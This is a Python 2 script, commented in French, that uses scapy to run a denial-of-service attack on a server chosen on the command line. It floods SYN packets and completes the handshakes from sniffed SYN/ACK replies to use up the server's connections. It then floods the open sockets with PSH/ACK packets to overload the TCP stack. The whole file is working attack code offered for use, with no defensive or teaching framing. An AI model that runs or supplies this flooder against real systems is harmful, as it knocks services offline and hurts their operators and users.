#-*-coding:Utf-8-*-
import sys,time
from scapy.all import *
from random import randint
from threading import Thread

#----------------------------------------------------------
# Attack stressed Out Picard                     |
#---------------------------------------------------------

# Principe de l'attaque:
# Phase 1 : Etablissement de connections par envoi massif de paquets SYN
#           Reception des paquets SYN/ACK par sniffing et envoi massif de paquets ACK avec le numero de sequence et d'accusé correspondants
# Phase 2 : Envoi massif de paquets flag PSH / ACK
#
# Cela aura pour effet de saturer le nombre de connections disponnible sur le serveur, puis de surcharger la pile TCP par des paquets flagés PUSH/ACK
# Il est envisageable de rajouter un flag URG

# Script en 3 parties (2 Thread, 1 Main)
# Processeur recomandé : 1ghz/2ghz bande passante correcte EXIGEE ;-)

#----------------------------------------------------------------
# Thread ACK :
#     Objectif : Flooder la cible avec des paquets ACK /PSH a
#           partir des ports ayant établis une connection
#    Liste de ports a flooder dynamique

class Ack(Thread):
    def __init__(self,target,port,nbPacket):
        self.t = target
        self.p = int(port)
        self.nb = int(nbPacket)
        self.listePort = []
        Thread.__init__(self)
    def addPort(self,nb): # Ajoute un port à la liste
        self.listePort.append(int(nb))
    def run(self):
        i = 0
        time.sleep(10)
        while i < self.nb:
            for port in self.listePort: #Pour chaque port de la liste, on envoie un paquet
                send(IP(dst = self.t)/TCP(dport = self.p, sport = port, flags = 'PA'))
            i = i + 1
        print str(i) + ' paquets PUSH / ACK envoyés pour chaque socket (valeur estimee)! '
        
#-----------------------------------------------------------------
# Thread Sniffer:
#    Objectif : Récupérer les paquets SynAck et renvoyer les
#           paquets ACK correspondants pour établir une
#           connection avec le serveur
#    Ajoute les ports sur lesquels on établit la connection à
#    la liste du thread Ack de manière Dynamique


class Sniffer(Thread):
    def __init__(self,target,port,nbPack):
        self.ACK = Ack(target,port,nbPack)
        self.nbPack = nbPack #nombre de paquets a envoyer par socket (attribut transféré au deuxieme thread si il est != 0)
        if nbPack != 0:
            self.ACK.start()
        Thread.__init__(self)
        self.t = target #Cible a attaquer
        self.p = port #Port a flooder
        self.sniff = 1 #Variable gérant le sniff
        self.nbSock = 0 #Variable comptant le nombre de connections établies
    def stop(self): #Methode stopant le sniffer
        self.sniff = 0
    def run(self):
        while self.sniff:
            a = sniff(count = 1)[0] #Récuperation d'un paquet TCP
            try:
                if a[TCP].flags == 18 and a[TCP].sport == self.p and a[IP].src == self.t: #Si c'est un paquet SynACK venant de la cible
                    numSeq = a[TCP].ack #Numero de sequence fixé
                    numAck = a[TCP].seq + 1 #Numero d'accusé fixé
                    send(IP(dst = self.t)/TCP(dport = self.p,sport = a[TCP].dport, flags = 'A',seq = numSeq,ack = numAck)) #Envoi du paquet
                    print 'paquet TCP ACK'
                    self.nbSock = self.nbSock + 1 #Incrementation du nombre de socket activées
                    if self.nbPack != 0:
                        self.ACK.addPort(a[TCP].dport) #Ajout du port dans la base de donnée du second thread
            except:
                pass
        print str(self.nbSock) + ' connections ont étée effectuées pendant cette attaque !'
        
#-----------------------------------------------------------
# Main:
#     Objectif : Envoyer massivement les paquets SYN pour
#           etablir les connections

if __name__ == '__main__':
    if len(sys.argv) < 5:
        print 'Syntaxe !/.py ip_serveur port nbPaquetsSyn nbPaquets_par_socket'
        exit(0)
    print '--- Socket Flooder + Spammer ACK.PSH ---'
    s = sys.argv[1]
    p = int(sys.argv[2])
    nbS = int(sys.argv[3])
    nb = int(sys.argv[4])
    a = Sniffer(s,p,nb) #Création du thread sniffer
    a.start()
    i = 0
    while i < nbS:
        send(IP(dst = s)/TCP(sport = randint(1,65535),dport = p,flags = 'S'))
        i = i + 1
    a.stop()
    
